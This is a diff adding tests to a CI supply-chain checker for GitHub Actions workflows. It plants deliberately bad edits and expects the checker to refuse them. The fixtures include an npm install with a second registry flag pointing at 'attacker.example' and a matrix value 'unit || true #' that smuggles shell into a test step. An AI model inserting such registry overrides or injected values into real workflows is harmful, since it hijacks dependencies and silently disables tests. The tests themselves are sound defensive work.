@@ -709,6 +709,7 @@ interface Declaration {
     preflight?: { job?: string; step?: string; mayPrecede?: string[] };
     gatedVerifications?: Record<string, string>;
     nestedActions?: string[];
+    dependencyMatrices?: Record<string, Record<string, string[]>>;
   }[];
   // Everything else the artifact carries — `$comment` today — travels through untouched.
   [key: string]: unknown;
@@ -3314,6 +3315,34 @@ describe("a global install names where the package comes from", () => {
     });
   }
 
+  it("reports a second --registry, because npm takes the last one", () => {
+    // Review finding [99]. The check read the FIRST match, so
+    // `--registry=<trusted> --registry=<attacker>` passed — and npm resolves that to the
+    // attacker's, verified against `npm config get registry` carrying both flags. A duplicate is
+    // refused rather than resolved: two answers to one question is not a pin, whichever end this
+    // lane reads from.
+    const dir = plantedTree((d) => {
+      editWorkflow(d, firstContext(d).workflow, (text) => {
+        const anchor = "      - name: Run build & pack verification\n";
+        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
+        return text.replace(
+          anchor,
+          "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry=https://registry.npmjs.org/ --registry=https://attacker.example/ corepack@0.35.0\n" +
+            anchor,
+        );
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `a second registry must exit 1:\n${run.output}`).toBe(1);
+      expect
+        .soft(run.output, "the finding must say npm takes the last one")
+        .toMatch(/npm takes the last/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
   it("accepts the trusted registry in either spelling, and a trailing slash either way", () => {
     // The control, in the two forms a shell writer actually uses. A rule accepting only one
     // of `--registry x` and `--registry=x` would be a rule this repository could not carry,
@@ -3837,6 +3866,101 @@ describe("the pre-flight stands where the attack passes", () => {
         .soft(run.exitCode, `a refusal in front of nothing must exit 1:\n${run.output}`)
         .toBe(1);
       expect.soft(run.output).toMatch(/invokes no local composite action/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
+describe("the values a gated lane expands over are pinned too", () => {
+  // Review finding [97]. `Run tests (${{ matrix.slice }})` is digested with the EXPRESSION in
+  // it, so the digest says nothing about what it expands to — and every value reaches a shell.
+  // `matrix-fail-fast` looks only at `fail-fast`, and nothing else looked at the values at all.
+
+  it("reports a matrix value rewritten into shell the digest cannot see", () => {
+    const dir = plantedTree((d) => {
+      editWorkflow(d, firstContext(d).workflow, (text) => {
+        const anchor = "        slice: [core, validators, integration, e2e, cli, unit, scripts]";
+        if (!text.includes(anchor)) throw new Error("the matrix anchor is stale");
+        return text.replace(
+          anchor,
+          '        slice: [core, validators, integration, e2e, cli, "unit || true #", scripts]',
+        );
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `a rewritten matrix value must exit 1:\n${run.output}`).toBe(1);
+      expect.soft(run.output).toMatch(/expands its matrix axis/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("reports a slice dropped from the list", () => {
+    // The quieter half: no value is rewritten, a whole slice simply stops running.
+    const dir = plantedTree((d) => {
+      editWorkflow(d, firstContext(d).workflow, (text) => {
+        const anchor = "        slice: [core, validators, integration, e2e, cli, unit, scripts]";
+        if (!text.includes(anchor)) throw new Error("the matrix anchor is stale");
+        return text.replace(
+          anchor,
+          "        slice: [core, validators, integration, e2e, cli, unit]",
+        );
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `a dropped slice must exit 1:\n${run.output}`).toBe(1);
+      expect.soft(run.output).toMatch(/expands its matrix axis/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("refuses a declaration that pins no matrix at all", () => {
+    const dir = plantedTree((d) => {
+      editDeclaration(d, (decl) => {
+        delete onlyContext(decl).dependencyMatrices;
+        return decl;
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect.soft(run.exitCode, `an unpinned matrix must exit 1:\n${run.output}`).toBe(1);
+      expect.soft(run.output).toMatch(/no .?dependencyMatrices.? mapping/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("checks the values against the declaration rather than against nothing", () => {
+    // Editing the DECLARATION must make the same tree fail, or the passing tree is satisfied by
+    // a lane that never compares.
+    const dir = plantedTree((d) => {
+      editDeclaration(d, (decl) => {
+        const context = onlyContext(decl);
+        const matrices = context.dependencyMatrices;
+        if (matrices === undefined) throw new Error("no matrix to edit");
+        const [job] = Object.keys(matrices);
+        if (job === undefined) throw new Error("no matrix job to edit");
+        const axes = matrices[job];
+        if (axes === undefined) throw new Error("no axes to edit");
+        const [axis] = Object.keys(axes);
+        if (axis === undefined) throw new Error("no axis to edit");
+        axes[axis] = [...(axes[axis] ?? []), "a-slice-the-workflow-does-not-run"];
+        return decl;
+      });
+    });
+    try {
+      const run = runLane(dir);
+      expect
+        .soft(
+          run.exitCode,
+          `a declaration naming a slice the tree does not run must exit 1:\n${run.output}`,
+        )
+        .toBe(1);
+      expect.soft(run.output).toMatch(/expands its matrix axis/);
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
